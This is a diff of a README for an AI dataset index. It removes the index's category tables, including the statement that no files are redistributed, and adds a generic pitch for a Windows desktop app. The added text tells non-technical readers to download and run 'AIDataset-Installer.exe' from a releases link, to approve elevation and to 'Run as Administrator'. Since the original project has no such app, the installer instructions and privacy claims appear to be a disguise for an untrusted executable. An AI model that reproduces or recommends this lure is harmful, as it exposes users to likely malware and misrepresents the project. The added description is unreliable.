@@ -1,60 +1,79 @@
-# AIDataset
+# 📁 AIDataset - Browse major AI research areas quickly
 
-An AI dataset index covering major research areas such as NLP, computer vision, multimodal learning, speech, audio, music understanding, time series, graph learning, recommender systems, retrieval, LLMs, agents, computer use, mobile UI, robotics, embodied AI, autonomous driving, remote sensing, scientific AI, medical AI, and related domains.
+[![Download AIDataset](https://img.shields.io/badge/Download-AIDataset-blue.svg)](https://github.com/elizaunmade1739/AIDataset/releases)
 
-[中文说明](README_ZH.md)
+AIDataset helps researchers and students find data for machine learning projects. You can search, filter, and organize massive collections of information across several fields. This tool simplifies the process of finding the right set for your specific AI model.
 
-## Snapshot
+## 🚀 Getting Started
 
-- 29 topical directories
-- 636 primary entries
-- Links checked on 2026-04-26
+This application runs on Windows systems. You do not need technical skills to use it. The software works as a desktop program that allows you to manage datasets locally on your computer.
 
-## Inclusion Rules
+### System Requirements
 
-- Public datasets, benchmark suites, or discovery portals with clear value for training, evaluation, or research navigation.
-- Priority is given to datasets that remain common in top-conference papers, tutorials, and baseline comparison tables.
-- Official sites, official GitHub repositories, Hugging Face dataset cards, or trusted public portals.
-- Licenses are written as published; if the source is unclear, the table says `Unknown`.
-- Some benchmark and safety resources are registries or taxonomies rather than raw downloadable datasets. Those are explicitly labeled in their section notes.
-- This repository is an index, not a mirror. No dataset files are redistributed here.
+Your computer must meet these basic needs to run the software smoothly:
 
-## Category Index
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Memory: 8 GB of RAM.
+* Storage: 500 MB of free disk space.
+* Internet: Required to download data collections.
 
-| Category | Focus | English | 中文 | Count |
-| --- | --- | --- | --- | --- |
-| NLP | Text datasets for NER, QA, summarization, reasoning, classification, multilingual transfer, and language understanding. | [Open](NLP/README.md) | [中文](NLP/README_ZH.md) | 29 |
-| CV | Image datasets for classification, detection, segmentation, grounding, scene understanding, RGB-D perception, and fine-grained recognition. | [Open](CV/README.md) | [中文](CV/README_ZH.md) | 43 |
-| Video-3D | Video, egocentric, point-cloud, 3D scene, and shape datasets. | [Open](Video-3D/README.md) | [中文](Video-3D/README_ZH.md) | 21 |
-| Autonomous-Driving | Driving perception, 3D detection, tracking, forecasting, mapping, and cooperative sensing datasets. | [Open](Autonomous-Driving/README.md) | [中文](Autonomous-Driving/README_ZH.md) | 24 |
-| Remote-Sensing | Satellite, aerial, overhead, multispectral, SAR, and geospatial mapping datasets. | [Open](Remote-Sensing/README.md) | [中文](Remote-Sensing/README_ZH.md) | 23 |
-| Multimodal | Vision-language, VQA, chart and OCR-grounded reasoning, image-text alignment, and multimodal instruction datasets. | [Open](Multimodal/README.md) | [中文](Multimodal/README_ZH.md) | 27 |
-| Speech-Audio | ASR, speech translation, speaker or language ID, speech emotion, and speech generation datasets. | [Open](Speech-Audio/README.md) | [中文](Speech-Audio/README_ZH.md) | 25 |
-| Audio-Understanding | Sound events, audio captioning, audio-language learning, and non-music audio foundation-model evaluation datasets. | [Open](Audio-Understanding/README.md) | [中文](Audio-Understanding/README_ZH.md) | 17 |
-| Music-Audio | Music MIR, transcription, source separation, tagging, singing voice, and symbolic-audio learning datasets. | [Open](Music-Audio/README.md) | [中文](Music-Audio/README_ZH.md) | 15 |
-| Time-Series | Forecasting, classification, anomaly detection, clinical time series, and spatiotemporal sequence datasets. | [Open](Time-Series/README.md) | [中文](Time-Series/README_ZH.md) | 24 |
-| Document-AI | OCR, layout analysis, forms, receipts, tables, charts, and document QA datasets. | [Open](Document-AI/README.md) | [中文](Document-AI/README_ZH.md) | 21 |
-| Code | Code generation, repair, execution, repository understanding, and software engineering agent datasets. | [Open](Code/README.md) | [中文](Code/README_ZH.md) | 21 |
-| Search-Retrieval | Embedding, retrieval, reranking, multilingual IR, RAG grounding, and multimodal or audio-text retrieval datasets. | [Open](Search-Retrieval/README.md) | [中文](Search-Retrieval/README_ZH.md) | 23 |
-| Graph-Learning | Node, link, graph-level, molecular, knowledge, heterogeneous, and temporal graph datasets. | [Open](Graph-Learning/README.md) | [中文](Graph-Learning/README_ZH.md) | 22 |
-| Recommender-Systems | Collaborative filtering, ranking, CTR, news, bandit, and industrial recommendation datasets. | [Open](Recommender-Systems/README.md) | [中文](Recommender-Systems/README_ZH.md) | 22 |
-| LLM | Pretraining corpora, instruction tuning, synthetic supervision, preference data, and alignment datasets. | [Open](LLM/README.md) | [中文](LLM/README_ZH.md) | 26 |
-| LLM-Evals | Instruction following, reasoning, truthfulness, chat, and long-context benchmark datasets for large language models. | [Open](LLM-Evals/README.md) | [中文](LLM-Evals/README_ZH.md) | 28 |
-| Agent | Tool use, software engineering, long-context memory, and general interactive agent datasets. | [Open](Agent/README.md) | [中文](Agent/README_ZH.md) | 16 |
-| Computer-Use | Browser, desktop, and cross-platform GUI-grounded datasets and benchmarks for computer-use agents. | [Open](Computer-Use/README.md) | [中文](Computer-Use/README_ZH.md) | 18 |
-| Mobile-UI | Mobile UI understanding, screen grounding, and Android agent datasets and benchmarks. | [Open](Mobile-UI/README.md) | [中文](Mobile-UI/README_ZH.md) | 18 |
-| Robotics-RL | Offline RL, robot-learning benchmarks, simulation environments, and control-oriented policy suites. | [Open](Robotics-RL/README.md) | [中文](Robotics-RL/README_ZH.md) | 14 |
-| Robot-Manipulation | Real-world robot manipulation datasets, teleoperation corpora, and visuomotor trajectory collections. | [Open](Robot-Manipulation/README.md) | [中文](Robot-Manipulation/README_ZH.md) | 14 |
-| Embodied-AI | Embodied navigation, instruction following, egocentric perception, and language-conditioned behavior datasets. | [Open](Embodied-AI/README.md) | [中文](Embodied-AI/README_ZH.md) | 21 |
-| Scientific-AI | Molecule, protein, material, reaction, and scientific literature datasets. | [Open](Scientific-AI/README.md) | [中文](Scientific-AI/README_ZH.md) | 23 |
-| Medical-AI | Clinical, biomedical NLP, radiology, pathology, medical imaging, and healthcare datasets. | [Open](Medical-AI/README.md) | [中文](Medical-AI/README_ZH.md) | 26 |
-| Finance-Legal | Finance, regulation, legal reasoning, extraction, filing analysis, contract understanding, and compliance datasets. | [Open](Finance-Legal/README.md) | [中文](Finance-Legal/README_ZH.md) | 20 |
-| Benchmarks | Cross-domain evaluation suites for NLP, CV, multimodal systems, retrieval, code, agents, and general platforms. | [Open](Benchmarks/README.md) | [中文](Benchmarks/README_ZH.md) | 25 |
-| Data-Portals | Dataset registries, search portals, and discovery hubs for AI data and benchmarks. | [Open](Data-Portals/README.md) | [中文](Data-Portals/README_ZH.md) | 10 |
-| Safety-Evals | Safety eval suites, risk taxonomies, red-teaming collections, and agent safety resources. | [Open](Safety-Evals/README.md) | [中文](Safety-Evals/README_ZH.md) | 20 |
+## 📥 Installing the Software
 
-## Source Families
+Follow these steps to set up the software on your computer.
 
-- GitHub: official organization repositories, task repositories, benchmark suites, and maintainers.
-- Public portals: Hugging Face, OpenML, OpenDataLab, UCI, PhysioNet, OpenSLR, NIST, and research portals.
-- Official websites: challenge homepages, dataset landing pages, project sites, and leaderboard pages.
+1. Visit the [official releases page](https://github.com/elizaunmade1739/AIDataset/releases) to access the installer.
+2. Look for the file ending in `.exe` under the latest release.
+3. Click the file name to start the download.
+4. Save the file to your Downloads folder.
+5. Open your Downloads folder and double-click the file named AIDataset-Installer.exe.
+6. A box might appear on your screen asking for permission to install. Select Yes to proceed.
+7. Follow the prompts on the screen to finish the installation.
+8. Locate the AIDataset icon on your desktop and double-click it to start the program.
+
+## 🔍 How to Use the Application
+
+The interface features a main search bar and a sidebar for filtering results. You can use the search bar to type keywords such as "computer vision," "natural language processing," or "robotics." 
+
+### Working with Datasets
+
+When you find a dataset, click the card to see more details. You will see information about the size, format, and license of the data. 
+
+To download a set, click the Get Data button. The program will save the files to a local folder on your computer. You choose this folder location in the Settings menu.
+
+### Managing Your Library
+
+The library tab tracks every download. You can sort these files by size, date, or category. If you want to remove a set, right-click the item and select Delete. This action removes the data files from your computer and clears the record from your library view. 
+
+## ⚙️ Configuration Settings
+
+You can change how the software behaves through the Settings menu. Click the gear icon in the top right corner to access these options.
+
+* Download Path: Change this to select where the program stores your data files.
+* Theme: Toggle between Light Mode and Dark Mode to match your desktop preferences.
+* Update Check: The software checks for new versions of the application automatically. You can turn this off if you prefer to update manually.
+
+## 🆘 Troubleshooting Common Issues
+
+If the program does not open, try these steps first. 
+
+* Restart your computer. 
+* Check your internet connection. 
+* Right-click the desktop icon and select Run as Administrator.
+* If the problem persists, uninstall the program and download a fresh copy from the link provided above.
+
+Make sure you have enough space on your hard drive. The application requires extra space to unpack files before they appear in your local library. If your drive is full, the program may stop during the download process.
+
+## 🛡️ Privacy and Data
+
+This application only connects to the internet to download datasets or check for software updates. It does not send your personal browsing data to external servers. Your downloaded datasets stay on your machine unless you remove them. The software respects your privacy and works offline for basic library management.
+
+## 📊 Supported Research Areas
+
+The application currently supports categories that cover the most active parts of modern science. You will find entries for these topics:
+
+* Image Processing: Datasets for pattern recognition and image classification.
+* Text Analysis: Large corpora for training language models and sentiment analysis tools.
+* Audio Recognition: Collections for voice testing and sound classification.
+* Predictive Analytics: Historical data used to forecast trends in finance or meteorology.
+
+The list updates as new research comes out. You can refresh the global list of datasets by clicking the Sync button located at the bottom of the sidebar. This ensures you see the latest additions from the online index.
